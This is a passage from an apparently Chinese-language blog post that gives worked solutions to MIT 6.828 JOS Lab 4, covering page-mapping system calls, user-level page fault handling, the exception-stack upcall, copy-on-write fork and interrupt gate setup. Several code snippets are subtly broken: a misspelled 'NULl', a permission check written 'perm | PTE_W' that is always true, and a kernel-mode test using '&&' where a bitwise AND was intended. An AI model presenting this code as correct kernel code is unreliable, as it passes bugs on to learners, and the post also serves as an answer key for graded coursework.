PTE_U|PTE_P;</span><br><span class="line"><span class="keyword">if</span> ((perm &amp; flag) != flag) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span> =</span> page_lookup(srce-&gt;env_pgdir,srcva,&amp;pte);</span><br><span class="line"><span class="keyword">if</span>(pp == NULl)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(perm | PTE_W)&#123;</span><br><span class="line"><span class="keyword">if</span> (!(*pte &amp; PTE_W)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">ret = page_insert(dste-&gt;env_pgdir,pp,dstva,perm);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是sys_page_unmap，就是page_remove的封装。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_page_unmap(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *va)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: This function is a wrapper around page_remove().</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_page_unmap not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line">ret = envid2env(envid,&amp;e,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((va &gt;= (<span class="keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">page_remove(e-&gt;env_pgdir,va);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别忘记在syscall函数中加上接口。</p><p>到这里我们就已经完成了part A的所有部分。</p><h2 id="Part-B-Copy-on-Write-Fork"><a href="#Part-B-Copy-on-Write-Fork" class="headerlink" title="Part B: Copy-on-Write Fork"></a>Part B: Copy-on-Write Fork</h2><p>实现fork的方式有两种，一种是将父进程的内容全部拷贝一次给子进程，这样的话子进程和父进程就能实现进程隔离，但是这种方式非常的耗时，需要在物理内存中复制父进程的内容。</p><p>另一种方式叫做<strong>写时复制</strong>，父进程将自己的页目录和页表复制给子进程，这样父进程和子进程就能访问相同的内容。只有当子进程执行写操作时，才复制这一物理页。这样既能做到地址空间隔离，又能节省大量的拷贝工作。用来图来对比这两种方式：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_3_%E5%86%99%E6%97%B6%E6%8B%B7%E8%B4%9Dfork.png" alt="非写时拷贝vs写时拷贝fork"></p><p>要实现写时复制的fork需要先实现用户级别的缺页中断处理函数，这里我们默认认为内核一定正确，没有缺页错误。</p><h3 id="User-level-page-fault-handling"><a href="#User-level-page-fault-handling" class="headerlink" title="User-level page fault handling"></a>User-level page fault handling</h3><p>Copy-on-Write 只是用户级页面错误处理的许多可能用途之一。</p><p>我们将利用用户级页面错误处理方式，来决定如何处理用户空间中的每个页面错误，而不采用传统的Unix方法，因为其产生的错误的破坏性较小。 这种设计的另一个好处是允许程序在定义内存区域时具有很大的灵活性; 稍后我们将使用用户级页面错误处理来映射和访问基于磁盘的文件系统上的文件。</p><p><strong>exercise8</strong></p><p>实现sys_env_set_pgfault_upcall(envid_t envid, void *func)系统调用。该系统调用为指定的用户环境设置env_pgfault_upcall。缺页中断发生时，会执行env_pgfault_upcall指定位置的代码。当执行env_pgfault_upcall指定位置的代码时，栈已经转到异常栈，并且压入了UTrapframe结构。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_env_set_pgfault_upcall(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *func)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_env_set_pgfault_upcall not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line">ret = envid2env(envid,&amp;e,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">&#125;</span><br><span class="line">e-&gt;env_pgfault_upcall = func;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Normal-and-Exception-Stacks-in-User-Environments"><a href="#Normal-and-Exception-Stacks-in-User-Environments" class="headerlink" title="Normal and Exception Stacks in User Environments"></a>Normal and Exception Stacks in User Environments</h4><p>当缺页中断发生时，内核会返回用户模式来处理该中断。我们需要一个用户异常栈，来模拟内核异常栈。JOS的用户异常栈被定义在虚拟地址UXSTACKTOP。</p><h4 id="Invoking-the-User-Page-Fault-Handler"><a href="#Invoking-the-User-Page-Fault-Handler" class="headerlink" title="Invoking the User Page Fault Handler"></a>Invoking the User Page Fault Handler</h4><p>缺页中断发送时会进入内核的trap()，然后分配page_fault_handler来处理缺页中断。在该函数中应该做如下几件事：</p><ol><li>判断curenv-&gt;env_pgfault_upcall是否设置，如果没有设置也就没办法修复，直接销毁该进程。</li><li>修改esp，切换到用户异常栈。</li><li>在栈上压入一个UTrapframe结构。</li><li>将eip设置为curenv-&gt;env_pgfault_upcall，然后回到用户态执行curenv-&gt;env_pgfault_upcall处的代码。</li></ol><p>UTrapframe结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                    &lt;-- UXSTACKTOP</span><br><span class="line">trap-time esp</span><br><span class="line">trap-time eflags</span><br><span class="line">trap-time eip</span><br><span class="line">trap-time eax       start of struct PushRegs</span><br><span class="line">trap-time ecx</span><br><span class="line">trap-time edx</span><br><span class="line">trap-time ebx</span><br><span class="line">trap-time esp</span><br><span class="line">trap-time ebp</span><br><span class="line">trap-time esi</span><br><span class="line">trap-time edi       end of struct PushRegs</span><br><span class="line">tf_err (error code)</span><br><span class="line">fault_va            &lt;-- %esp when handler is run</span><br></pre></td></tr></table></figure><p><strong>exercise9</strong></p><p>按照上面的描述实现page_fault_handler()。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_fault_handler(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> fault_va;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read processor&#x27;s CR2 register to find the faulting address</span></span><br><span class="line">fault_va = rcr2();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handle kernel-mode page faults.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span>((tf-&gt;tf_cs &amp;&amp; <span class="number">0x1</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">panic(<span class="string">&quot;page fault in kernel-mode,fault address %d\n&quot;</span>,fault_va);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// We&#x27;ve already handled kernel-mode exceptions, so if we get here,</span></span><br><span class="line"><span class="comment">// the page fault happened in user mode.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the environment&#x27;s page fault upcall, if one exists.  Set up a</span></span><br><span class="line"><span class="comment">// page fault stack frame on the user exception stack (below</span></span><br><span class="line"><span class="comment">// UXSTACKTOP), then branch to curenv-&gt;env_pgfault_upcall.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The page fault upcall might cause another page fault, in which case</span></span><br><span class="line"><span class="comment">// we branch to the page fault upcall recursively, pushing another</span></span><br><span class="line"><span class="comment">// page fault stack frame on top of the user exception stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// It is convenient for our code which returns from a page fault</span></span><br><span class="line"><span class="comment">// (lib/pfentry.S) to have one word of scratch space at the top of the</span></span><br><span class="line"><span class="comment">// trap-time stack; it allows us to more easily restore the eip/esp. In</span></span><br><span class="line"><span class="comment">// the non-recursive case, we don&#x27;t have to worry about this because</span></span><br><span class="line"><span class="comment">// the top of the regular user stack is free.  In the recursive case,</span></span><br><span class="line"><span class="comment">// this means we have to leave an extra word between the current top of</span></span><br><span class="line"><span class="comment">// the exception stack and the new stack frame because the exception</span></span><br><span class="line"><span class="comment">// stack _is_ the trap-time stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If there&#x27;s no page fault upcall, the environment didn&#x27;t allocate a</span></span><br><span class="line"><span class="comment">// page for its exception stack or can&#x27;t write to it, or the exception</span></span><br><span class="line"><span class="comment">// stack overflows, then destroy the environment that caused the fault.</span></span><br><span class="line"><span class="comment">// Note that the grade script assumes you will first check for the page</span></span><br><span class="line"><span class="comment">// fault upcall and print the &quot;user fault va&quot; message below if there is</span></span><br><span class="line"><span class="comment">// none.  The remaining three checks can be combined into a single test.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//   user_mem_assert() and env_run() are useful here.</span></span><br><span class="line"><span class="comment">//   To change what the user environment runs, modify &#x27;curenv-&gt;env_tf&#x27;</span></span><br><span class="line"><span class="comment">//   (the &#x27;tf&#x27; variable points at &#x27;curenv-&gt;env_tf&#x27;).</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (curenv-&gt;env_pgfault_upcall) &#123;</span><br><span class="line"><span class="keyword">uintptr_t</span> stacktop = UXSTACKTOP;</span><br><span class="line"><span class="keyword">if</span> (UXSTACKTOP - PGSIZE &lt; tf-&gt;tf_esp &amp;&amp; tf-&gt;tf_esp &lt; UXSTACKTOP) &#123;</span><br><span class="line">stacktop = tf-&gt;tf_esp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">uint32_t</span> size = <span class="keyword">sizeof</span>(struct UTrapframe) + <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>);</span><br><span class="line">user_mem_assert(curenv, (<span class="keyword">void</span> *)stacktop - size, size, PTE_U | PTE_W);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">UTrapframe</span> *<span class="title">utr</span> =</span> (struct UTrapframe *)(stacktop - size);</span><br><span class="line">utr-&gt;utf_fault_va = fault_va;</span><br><span class="line">utr-&gt;utf_err = tf-&gt;tf_err;</span><br><span class="line">utr-&gt;utf_regs = tf-&gt;tf_regs;</span><br><span class="line">utr-&gt;utf_eip = tf-&gt;tf_eip;</span><br><span class="line">utr-&gt;utf_eflags = tf-&gt;tf_eflags;</span><br><span class="line">utr-&gt;utf_esp = tf-&gt;tf_esp;<span class="comment">//UXSTACKTOP栈上需要保存发生缺页异常时的%esp和%eip</span></span><br><span class="line"></span><br><span class="line">curenv-&gt;env_tf.tf_eip = (<span class="keyword">uintptr_t</span>)curenv-&gt;env_pgfault_upcall;</span><br><span class="line">curenv-&gt;env_tf.tf_esp = (<span class="keyword">uintptr_t</span>)utr;</span><br><span class="line">env_run(curenv);<span class="comment">//重新进入用户态</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Destroy the environment that caused the fault.</span></span><br><span class="line">cprintf(<span class="string">&quot;[%08x] user fault va %08x ip %08x\n&quot;</span>,</span><br><span class="line">curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);</span><br><span class="line">print_trapframe(tf);</span><br><span class="line">env_destroy(curenv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="User-mode-Page-Fault-Entrypoint"><a href="#User-mode-Page-Fault-Entrypoint" class="headerlink" title="User-mode Page Fault Entrypoint"></a>User-mode Page Fault Entrypoint</h4><p><strong>exercise10</strong></p><p>现在需要实现lib/pfentry.S中的_pgfault_upcall函数，该函数会作为系统调用sys_env_set_pgfault_upcall()的参数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">addl $<span class="number">8</span>, %esp                 <span class="comment">// esp+8 -&gt; PushRegs   over utf_fault_va utf_err</span></span><br><span class="line">   movl <span class="number">0x20</span>(%esp), %eax         <span class="comment">// eax = (esp+0x20 -&gt; utf_eip )</span></span><br><span class="line">   subl $<span class="number">4</span>, <span class="number">0x28</span>(%esp)           <span class="comment">// for trap time eip 保留32bit,   esp+48 = utf_esp</span></span><br><span class="line">   movl <span class="number">0x28</span>(%esp), %edx         <span class="comment">// %edx = utf_esp-4  </span></span><br><span class="line">   movl %eax, (%edx)             <span class="comment">// %eax = eip ----&gt; esp-4  以至于ret可以直接读取其继续执行的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Restore the trap-time registers.  After you do this, you</span></span><br><span class="line"><span class="comment">// can no longer modify any general-purpose registers.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">popal              <span class="comment">// after popal esp-&gt;utf_eip</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Restore eflags from the stack.  After you do this, you can</span></span><br><span class="line"><span class="comment">// no longer use arithmetic operations or anything else that</span></span><br><span class="line"><span class="comment">// modifies eflags.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">addl $<span class="number">4</span>, %esp      <span class="comment">// esp+4 -&gt; utf_eflags</span></span><br><span class="line">   popfl</span><br><span class="line"></span><br><span class="line"><span class="comment">// Switch back to the adjusted trap-time stack.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">popl %esp</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return to re-execute the instruction that faulted.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><strong>exercise11</strong></p><p>完成lib/pgfault.c中的set_pgfault_handler()。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">set_pgfault_handler(<span class="keyword">void</span> (*handler)(struct UTrapframe *utf))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_pgfault_handler == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// First time through!</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;set_pgfault_handler not implemented&quot;);</span></span><br><span class="line">sys_page_alloc(sys_getenvid(), (<span class="keyword">void</span> *) (UXSTACKTOP - PGSIZE), PTE_SYSCALL);</span><br><span class="line">        sys_env_set_pgfault_upcall(sys_getenvid(), _pgfault_upcall);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save handler pointer for assembly to call.</span></span><br><span class="line">_pgfault_handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="缺页处理小结："><a href="#缺页处理小结：" class="headerlink" title="缺页处理小结："></a>缺页处理小结：</h4><ol><li>引发缺页中断，执行内核函数链子：trap()-&gt;trap_dispatch()-&gt;page_fault_handler()</li><li>page_fault_handler()切换到用户异常栈，并且压入UTrapframe结构，然后调用curenv-&gt;env_pgfault_upcall(系统调用sys_env_set_pgfault_upcall()设置，之前已经设置为_pgfault_upcall)处的代码。又重新回到用户态。</li><li>执行_pgfault_upcall处的代码，调用pgfault_handler(库函数set_pgfault_handler()设置)处的代码，最后返回到缺页处理中断发生时的那条指令重新执行。</li></ol><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_4_%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91.png" alt="JOS缺页异常处理逻辑"></p><h3 id="Implementing-Copy-on-Write-Fork"><a href="#Implementing-Copy-on-Write-Fork" class="headerlink" title="Implementing Copy-on-Write Fork"></a>Implementing Copy-on-Write Fork</h3><p>到目前已经可以实现用户级别的写时拷贝fork函数了。fork流程如下：</p><ol><li>使用set_pgfault_handler()设置缺页处理函数。</li><li>调用sys_exofork()系统调用，在内核中创建一个Env结构，复制当前用户环境寄存器状态，UTOP以下的页目录还没有建立，新创建的进程还不能直接运行。</li><li>拷贝父进程的页表和页目录到子进程。对于可写的页，将对应的PTE的PTE_COW位设置为1。</li><li>为子进程设置_pgfault_upcall。</li><li>将子进程状态设置为ENV_RUNNABLE。</li></ol><p>缺页处理函数pgfault()流程如下：</p><ol><li>如果发现错误是因为写造成的（错误码是FEC_WR）并且该页的PTE_COW是1，则进行执行第2步，否则直接panic。</li><li>分配一个新的物理页，并将之前出现错误的页的内容拷贝到新的物理页，然后重新映射线性地址到新的物理页。</li></ol><p><strong>exercise12</strong></p><p>实现lib/fork.c中的fork, duppage and pgfault。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">pgfault(struct UTrapframe *utf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="keyword">uint32_t</span> err = utf-&gt;utf_err;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the faulting access was (1) a write, and (2) to a</span></span><br><span class="line"><span class="comment">// copy-on-write page.  If not, panic.</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use the read-only page table mappings at uvpt</span></span><br><span class="line"><span class="comment">//   (see &lt;inc/memlayout.h&gt;).</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (!((err &amp; FEC_WR) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_COW))) &#123; <span class="comment">//只有因为写操作写时拷贝的地址这中情况，才可以抢救。否则一律panic</span></span><br><span class="line">panic(<span class="string">&quot;pgfault():not cow&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a new page, map it at a temporary location (PFTEMP),</span></span><br><span class="line"><span class="comment">// copy the data from the old page to the new page, then move the new</span></span><br><span class="line"><span class="comment">// page to the old page&#x27;s address.</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   You should make three system calls.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, PFTEMP, PTE_U|PTE_P)) &lt; <span class="number">0</span>)<span class="comment">//将当前进程PFTEMP也映射到当前进程addr指向的物理页</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_map: %e&quot;</span>, r);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(<span class="number">0</span>, addr, PTE_P|PTE_U|PTE_W)) &lt; <span class="number">0</span>)<span class="comment">//令当前进程addr指向新分配的物理页</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_alloc: %e&quot;</span>, r);</span><br><span class="line">memmove(addr, PFTEMP, PGSIZE);<span class="comment">//将PFTEMP指向的物理页拷贝到addr指向的物理页</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_unmap(<span class="number">0</span>, PFTEMP)) &lt; <span class="number">0</span>)<span class="comment">//解除当前进程PFTEMP映射</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_unmap: %e&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">duppage(<span class="keyword">envid_t</span> envid, <span class="keyword">unsigned</span> pn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span>*) (pn * PGSIZE);</span><br><span class="line"><span class="keyword">if</span> (uvpt[pn] &amp; PTE_SHARE) &#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_SYSCALL);<span class="comment">//对于表示为PTE_SHARE的页，拷贝映射关系，并且两个进程都有读写权限</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((uvpt[pn] &amp; PTE_W) || (uvpt[pn] &amp; PTE_COW)) &#123; <span class="comment">//对于UTOP以下的可写的或者写时拷贝的页，拷贝映射关系的同时，需要同时标记当前进程和子进程的页表项为PTE_COW</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, PTE_COW|PTE_U|PTE_P)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;sys_page_map：%e&quot;</span>, r);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">sys_page_map(<span class="number">0</span>, addr, envid, addr, PTE_U|PTE_P);<span class="comment">//对于只读的页，只需要拷贝映射关系即可</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">envid_t</span></span><br><span class="line">fork(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">void</span> _pgfault_upcall(<span class="keyword">void</span>);</span><br><span class="line">set_pgfault_handler(pgfault);<span class="comment">//设置缺页处理函数</span></span><br><span class="line"><span class="keyword">envid_t</span> envid = sys_exofork();<span class="comment">//系统调用，只是简单创建一个Env结构，复制当前用户环境寄存器状态，UTOP以下的页目录还没有建立</span></span><br><span class="line"><span class="keyword">if</span> (envid == <span class="number">0</span>) &#123;<span class="comment">//子进程将走这个逻辑</span></span><br><span class="line">thisenv = &amp;envs[ENVX(sys_getenvid())];</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (envid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">panic(<span class="string">&quot;sys_exofork: %e&quot;</span>, envid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> addr;</span><br><span class="line"><span class="keyword">for</span> (addr = <span class="number">0</span>; addr &lt; USTACKTOP; addr += PGSIZE) &#123;</span><br><span class="line"><span class="keyword">if</span> ((uvpd[PDX(addr)] &amp; PTE_P) &amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_P) </span><br><span class="line">&amp;&amp; (uvpt[PGNUM(addr)] &amp; PTE_U)) &#123;</span><br><span class="line">duppage(envid, PGNUM(addr));<span class="comment">//拷贝当前进程映射关系到子进程</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_alloc(envid, (<span class="keyword">void</span> *)(UXSTACKTOP-PGSIZE), PTE_P | PTE_W | PTE_U)) &lt; <span class="number">0</span>)<span class="comment">//为子进程分配异常栈</span></span><br><span class="line">panic(<span class="string">&quot;sys_page_alloc: %e&quot;</span>, r);</span><br><span class="line">sys_env_set_pgfault_upcall(envid, _pgfault_upcall);<span class="comment">//为子进程设置_pgfault_upcall</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((r = sys_env_set_status(envid, ENV_RUNNABLE)) &lt; <span class="number">0</span>)<span class="comment">//设置子进程为ENV_RUNNABLE状态</span></span><br><span class="line">panic(<span class="string">&quot;sys_env_set_status: %e&quot;</span>, r);</span><br><span class="line"><span class="keyword">return</span> envid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Part-C-Preemptive-Multitasking-and-Inter-Process-communication-IPC"><a href="#Part-C-Preemptive-Multitasking-and-Inter-Process-communication-IPC" class="headerlink" title="Part C: Preemptive Multitasking and Inter-Process communication (IPC)"></a>Part C: Preemptive Multitasking and Inter-Process communication (IPC)</h2><p>在partC部分，我们要实现抢占非协作式环境，并且实现进程间通信。</p><h3 id="Clock-Interrupts-and-Preemption"><a href="#Clock-Interrupts-and-Preemption" class="headerlink" title="Clock Interrupts and Preemption"></a>Clock Interrupts and Preemption</h3><p>如果一个进程获得CPU后一直死循环而不主动让出CPU的控制权， 整个系统都将 halt。为了允许内核抢占正在运行的环境，强行重获CPU控制权，我们必须扩展JOS内核以支持来自时钟的外部硬件中断。</p><h4 id="Interrupt-discipline"><a href="#Interrupt-discipline" class="headerlink" title="Interrupt discipline"></a>Interrupt discipline</h4><p>外部中断（如设备中断）被称为 IRQs。 IRQ号到 IDT 项的映射不是固定的，其会加上一个IRQ_OFFSET的偏移，在picirq.c的pic_init中进行了这个映射过程。外部中断的初始化，实际上就是对硬件 8259A的初始化。</p><p>我们必须确保在用户环境中运行时设置FL_IF标志，以便在中断到达时，它将被传递到处理器并由中断代码处理。 否则，中断将被屏蔽或被忽略，直到重新启用中断为止。Bootloader 的第一条指令屏蔽了中断，到目前为止，我们还没有重新使能它们。</p><p><strong>exercise13</strong></p><p>首先修改Trapentry.s，当调用硬件中断处理时，处理器不会传入错误代码，因此我们需要调用TRAPHANDLER_NOEC宏。添加如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TRAPHANDLER_NOEC(timer_handler, IRQ_OFFSET + IRQ_TIMER);</span><br><span class="line">TRAPHANDLER_NOEC(kbd_handler, IRQ_OFFSET + IRQ_KBD);</span><br><span class="line">TRAPHANDLER_NOEC(serial_handler, IRQ_OFFSET + IRQ_SERIAL);</span><br><span class="line">TRAPHANDLER_NOEC(spurious_handler, IRQ_OFFSET + IRQ_SPURIOUS);</span><br><span class="line">TRAPHANDLER_NOEC(ide_handler, IRQ_OFFSET + IRQ_IDE);</span><br><span class="line">TRAPHANDLER_NOEC(error_handler, IRQ_OFFSET + IRQ_ERROR);</span><br></pre></td></tr></table></figure><p>然后修改trap.c，注册IDT</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kbd_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serial_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spurious_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ide_handler</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handler</span><span class="params">()</span></span>;</span><br><span class="line">...</span><br><span class="line">SETGATE(idt[IRQ_OFFSET + IRQ_TIMER],<span class="number">0</span>,GD_KT,timer_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_KBD],<span class="number">0</span>,GD_KT,kbd_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_SERIAL],<span class="number">0</span>,GD_KT,serial_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_SPURIOUS],<span class="number">0</span>,GD_KT,spurious_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_IDE],<span class="number">0</span>,GD_KT,ide_handler,<span class="number">0</span>);</span><br><span class="line">    SETGATE(idt[IRQ_OFFSET + IRQ_ERROR],<span class="number">0</span>,GD_KT,error_handler,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在env_alloc中加入以下代码， 同时取消 sched_halt()中sti的注释，使能中断。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Enable interrupts while in user mode.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">e-&gt;env_tf.tf_eflags |= FL_IF;</span><br></pre></td></tr></table></figure><h4 id="Handling-Clock-Interrupts"><a href="#Handling-Clock-Interrupts" class="headerlink" title="Handling Clock Interrupts"></a>Handling Clock 